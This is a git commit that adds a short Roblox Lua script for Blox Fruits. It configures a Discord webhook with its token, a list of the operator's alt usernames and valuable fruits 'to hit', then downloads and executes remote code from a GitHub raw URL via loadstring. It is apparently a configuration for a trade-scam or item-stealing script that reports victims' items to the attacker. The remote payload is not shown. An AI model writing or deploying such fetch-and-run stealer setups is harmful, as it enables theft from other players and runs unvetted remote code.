e0d70f54ec12dd0975d68390e4aca7160a73f318
SCRIHUB <scriptroblox624@gmail.com>
2025-04-07 09:46:44 -0400

    Create Bloxfruitstrade.lua

---
+++ Bloxfruitstrade.lua
@@ -0,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1357098922564259870/80OZlSafIZ6dM39LoJ6q6WJGbBwZXBCJd-UYt4FrKT_L9-p-53Dm7cYdt3iFmEgzGXe-" -- << Your Webhook
+Usernames = {"Sellyelpro", "user2", "user3", "user4", "user5"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
